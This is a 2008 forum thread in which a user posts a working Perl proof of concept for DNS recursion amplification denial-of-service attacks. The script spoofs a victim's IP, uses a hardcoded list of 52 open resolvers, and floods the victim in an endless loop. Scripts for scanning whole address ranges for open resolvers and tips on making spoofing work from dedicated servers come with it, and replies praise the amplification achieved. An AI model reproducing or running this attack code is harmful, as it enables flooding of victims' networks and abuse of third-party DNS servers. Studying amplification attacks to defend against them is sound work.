## DNS Recursion DoS PoC
Posted by **Shadow** on Sat February 16th, 2008 06:38:38 PM

A few months ago I made a public PoC for DNS Recursion bandwidth amplification attacks. You might have seen it posted on milw0rm, packetstorm and bugtraq, and from there a bunch of other places.

[code:3lef6qmw]
#!/usr/bin/perl
# Get Net&#58;&#58;RawIP at http&#58;//search&#46;cpan&#46;org/CPAN/authors/id/S/SZ/SZABGAB/Net-RawIP-0&#46;21_01&#46;tar&#46;gz
# cpan Net&#58;&#58;DNS&#58;Resolver seems to work fine on each machine I throw it on, as well&#46;
# PS&#58; To see if you can spoof, check out the ANA Spoofer project&#46;
# http&#58;//spoofer&#46;csail&#46;mit&#46;edu/
#
# Written by Shadow
# chemshadow@gmail&#46;com

use Net&#58;&#58;DNS&#58;&#58;Resolver;
use Net&#58;&#58;RawIP;
use strict;

# Populate this list with domain names with lots of A records&#46; IRC server DNS pools are a good place to look&#46;
# Maybe get a cheap throwaway domain and add your own A records&#46;
my @name = (&quot;irc&#46;efnet&#46;net&quot;, &quot;irc&#46;dal&#46;net&quot;, &quot;irc&#46;undernet&#46;org&quot;, &quot;irc&#46;freenode&#46;net&quot;);
my $names = &quot;3&quot;; #number of entries in @name, minus one&#46;

# Populate this list with ONLY open, recursive dns servers&#46;
# http&#58;//www&#46;dnsstuff&#46;com/ - Block their cookies to use the site w/o paying&#46;
my $nameservers;
my @nameservers = (&quot;205&#46;234&#46;223&#46;168&quot;, &quot;64&#46;202&#46;117&#46;121&quot;, &quot;208&#46;80&#46;184&#46;69&quot;, &quot;200&#46;255&#46;59&#46;150&quot;,
                   &quot;38&#46;99&#46;131&#46;12&quot;, &quot;207&#46;41&#46;41&#46;248&quot;, &quot;69&#46;225&#46;174&#46;141&quot;, &quot;68&#46;87&#46;96&#46;3&quot;,
                   &quot;68&#46;87&#46;96&#46;4&quot;, &quot;195&#46;122&#46;131&#46;250&quot;, &quot;80&#46;237&#46;244&#46;50&quot;, &quot;38&#46;99&#46;77&#46;80&quot;,
                   &quot;69&#46;93&#46;224&#46;2&quot;, &quot;38&#46;99&#46;76&#46;229&quot;, &quot;38&#46;99&#46;76&#46;3&quot;, &quot;38&#46;99&#46;76&#46;2&quot;,
                   &quot;216&#46;55&#46;155&#46;41&quot;, &quot;216&#46;55&#46;155&#46;33&quot;, &quot;208&#46;48&#46;232&#46;157&quot;, &quot;64&#46;124&#46;191&#46;6&quot;,
                   &quot;143&#46;166&#46;82&#46;251&quot;, &quot;143&#46;166&#46;82&#46;252&quot;, &quot;143&#46;166&#46;224&#46;3&quot;, &quot;143&#46;166&#46;224&#46;11&quot;,
                   &quot;143&#46;166&#46;83&#46;13&quot;, &quot;209&#46;78&#46;77&#46;2&quot;, &quot;8&#46;4&#46;80&#46;15&quot;, &quot;216&#46;213&#46;88&#46;50&quot;,
                   &quot;64&#46;7&#46;203&#46;250&quot;, &quot;66&#46;165&#46;186&#46;15&quot;, &quot;64&#46;7&#46;203&#46;251&quot;, &quot;66&#46;165&#46;186&#46;16&quot;,
                   &quot;209&#46;162&#46;192&#46;4&quot;, &quot;209&#46;200&#46;46&#46;12&quot;, &quot;69&#46;42&#46;71&#46;212&quot;, &quot;209&#46;200&#46;46&#46;12&quot;,
                   &quot;69&#46;42&#46;71&#46;212&quot;, &quot;212&#46;112&#46;231&#46;183&quot;, &quot;212&#46;124&#46;35&#46;14&quot;, &quot;207&#46;254&#46;41&#46;30&quot;,
                   &quot;204&#46;141&#46;20&#46;253&quot;, &quot;204&#46;141&#46;20&#46;193&quot;, &quot;195&#46;92&#46;253&#46;2&quot;, &quot;209&#46;132&#46;176&#46;167&quot;,
                   &quot;66&#46;55&#46;68&#46;10&quot;, &quot;66&#46;55&#46;68&#46;11&quot;, &quot;66&#46;175&#46;230&#46;5&quot;, &quot;66&#46;175&#46;230&#46;10&quot;,
                   &quot;74&#46;84&#46;206&#46;221&quot;, &quot;74&#46;84&#46;206&#46;132&quot;, &quot;64&#46;58&#46;142&#46;2&quot;, &quot;64&#46;58&#46;142&#46;3&quot;); #52 entries&#46;

my $reflectors = &quot;51&quot;; # Number of entries in @nameservers, minus one&#46;
my $debug = 1; # Change to 0 if you don't wanna have your console flooded&#46;

##########################
# END USER CONFIGURATION #
##########################
my $str;
my $name;
my $src_ip;
my $reflector;
$src_ip = $ARGV&#91;0&#93;;

if ($ARGV&#91;0&#93; eq '') { print &quot;Usage&#58; &quot; &#46; $0 &#46; &quot; &lt;IP&gt;\n&quot;; exit(0); }
print (&quot;Hitting $ARGV&#91;0&#93;\n&quot;);

for (my $i=0; $i &lt; 256; $i++) {
    # Make DNS packet
    my $dnspacket = new Net&#58;&#58;DNS&#58;&#58;Packet($str, &quot;A&quot;, &quot;IN&quot;);
    my $dnsdata = $dnspacket-&gt;data;
    my $sock = new Net&#58;&#58;RawIP({udp=&gt;{}});
    # send packet
    $str = @name&#91;int rand($names)&#93;;                            # Select entry from @name
    $reflector = $nameservers&#91;int rand($reflectors)&#93;;          # Select entry from @nameservers
    $sock-&gt;set({ip =&gt; {
                saddr =&gt; $src_ip, daddr =&gt; &quot;$reflector&quot;, frag_off=&gt;0,tos=&gt;0,id=&gt;1565},
                udp =&gt; {source =&gt; 53,
                dest =&gt; 53, data=&gt;$dnsdata
                } });
    $sock-&gt;send;
    if ($debug eq &quot;1&quot;) { print &quot;Me -&gt; &quot; &#46; $reflector &#46; &quot;(DNSing &quot; &#46; $str &#46; &quot;)&quot; &#46; &quot; -&gt; &quot; &#46; $src_ip &#46; &quot; \n&quot;; }
    $i = 0;
}
exit(0);
[/code:3lef6qmw]

Anyway, it's not the most efficient code(I'm using random instead of incrimental steps in the selection in this copy), and it won't work on consumer lines unless you feel like hitting a LAN target as consumer ISPs use filtering to prevent spoofing, but it works for example purposes. Using it from a dedicated server *does* work though.

There's also a C port, made by ctrlaltca which can be found attached to <!-- m --><a class="postlink" href="http://www.derkeiler.com/Mailing-Lists/securityfocus/bugtraq/2007-11/msg00159.html">http://www.derkeiler.com/Mailing-Lists/ ... 00159.html</a><!-- m -->


Locating nameservers is also easier than you'd think. fyodor (author of nmap) recently revamped scripting support in nmap, and this is something which comes in handy:

dns-test-open-recursion.nse
[code:3lef6qmw]
id = &quot;Nameserver open recursive querys (CVE-1999-0024) (BID 136, 678)&quot;

description = &quot;Checks whether a Nameserver on udp/53 allows querys for third-party names&#46; If is expected that recursion will be enabled on your own internal nameserver&#46;&quot;

author = &quot;Felix Groebert &lt;felix@groebert&#46;org&gt;&quot;

license = &quot;See nmaps COPYING for licence&quot;

categories = {&quot;intrusive&quot;}

require &quot;bit&quot;
require &quot;shortport&quot;

portrule = shortport&#46;portnumber(53, &quot;udp&quot;)

action = function(host, port)

    -- generate dns query, Transaction-ID 0xdead, isc&#46;sans&#46;org (type A, class IN)
        local request = string&#46;char(0xde, 0xad, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03) &#46;&#46;  &quot;isc&quot; &#46;&#46; string&#46;char(0x04) &#46;&#46; &quot;sans&quot; &#46;&#46; string&#46;char(0x03) &#46;&#46;  &quot;org&quot; &#46;&#46; string&#46;char(0x00, 0x00, 0x01, 0x00, 0x01)

        local socket = nmap&#46;new_socket()
        socket&#58;connect(host&#46;ip, port&#46;number, &quot;udp&quot;)
        socket&#58;send(request)

        local status, result = socket&#58;receive();
        socket&#58;close()

    -- parse response for dns flags
    if (bit&#46;band(string&#46;byte(result,3), 0x80) == 0x80
    and bit&#46;band(string&#46;byte(result,4), 0x85) == 0x80)
    then
                return &quot;Recursion seems enabled &quot; &#46;&#46; host&#46;ip
    else
                return &quot;Recursion disabled&quot;
        end

        return
end
[/code:3lef6qmw]

test.sh
[code:3lef6qmw]
#!/bin/bash
if &#91; $# != 1 &#93;; then
echo &quot;#Usage&#58; $0 &lt;class&gt;&quot;
echo &quot;&#91;+&#93;     $0 66&quot;
exit;
fi
x=0
while &#91; $x -le 254 &#93;
do
nmap -sC --script=dns-test-open-recursion&#46;nse -n -e eth1 -p 53 -sU -oN test$1&#46;$x&#46;out -T insane $1&#46;$x&#46;*&#46;*
sleep 1
x=$((x+1))
done
[/code:3lef6qmw]

results.sh

[code:3lef6qmw]
#!/bin/bash
rm new&#46;results
cat *&#46;out | grep enabled | awk '{ print $13 }' | sort -u &gt; new&#46;results
cat *&#46;results | sort -u
[/code:3lef6qmw]

the latest nmap also comes with other interesting and useful scripts - based on LUA - that can be used during any normal scan by adding -sC --script=all to the CLI. Use the latest version of nmap. See <!-- m --><a class="postlink" href="http://nmap.org/man/man-nse.html">http://nmap.org/man/man-nse.html</a><!-- m --> for more information on the nmap scripting engine. Here's an example of scripts that come with nmap as per default, most of which are self explainitory.

[quote:3lef6qmw]
shadow@tourian:/usr/local/share/nmap/scripts&gt; ls
anonFTP.nse                  HTTPtrace.nse                 promiscuous.nse          skype_v2-version.nse
bruteTelnet.nse              iax2Detect.nse                RealVNC_auth_bypass.nse  SMTPcommands.nse
chargenTest.nse              ircServerInfo.nse             ripeQuery.nse            SMTP_openrelay_test.nse
daytimeTest.nse              ircZombieTest.nse             robots.nse               SNMPsysdesr.nse
dns-test-open-recursion.nse  kibuvDetection.nse            rpcinfo.nse              SQLInject.nse
echoTest.nse                 MSSQLm.nse                    script.db                SSHv1-support.nse
finger.nse                   mswindowsShell.nse            showHTMLTitle.nse        SSLv2-support.nse
ftpbounce.nse                MySQLinfo.nse                 showHTTPVersion.nse      strangeSMTPport.nse
HTTPAuth.nse                 nbstat.nse                    showOwner.nse            UPnP-info.nse
HTTP_open_proxy.nse          netbios-smb-os-discovery.nse  showSMTPVersion.nse      xamppDefaultPass.nse
HTTPpasswd.nse               PPTPversion.nse               showSSHVersion.nse       zoneTrans.nse
shadow@tourian:/usr/local/share/nmap/scripts&gt;
[/quote:3lef6qmw]

Given the recent improvements in NSE, I wonder how long it'll take nmap to join metasploit in the exploitation framework catagory.


- Mike

--------------------------------------------------------------------------------

Posted by **nak** on Sat February 16th, 2008 09:48:44 PM

Nice <!-- s:) --><img src="{SMILIES_PATH}/icon_e_smile.gif" alt=":)" title="Smile" /><!-- s:) -->
I saw the defcon presentation on this last year, and wow.

Looks like a good job, just from a brief eyeballing... I don't know C or perl that well, but I'm sure I could port it to python <!-- s;) --><img src="{SMILIES_PATH}/icon_e_wink.gif" alt=";)" title="Wink" /><!-- s;) -->

--------------------------------------------------------------------------------

Posted by **Shadow** on Sat February 16th, 2008 11:41:24 PM

That'd actually be kickass, cross platform JiT? Nifty.

PS: Screenshot from awhile back, using efnet as query (gives 6.9x amplification)

[img:24mlp37v]http&#58;//img100&#46;imageshack&#46;us/img100/4718/recursivegm8&#46;png[/img:24mlp37v]

--------------------------------------------------------------------------------

Posted by **PHLAK** on Mon February 18th, 2008 11:57:43 AM

Hmmm... very interesting.  I'm with Nak though, don't know a lot of C or Perl either, but what I can tell, looks sufficient.
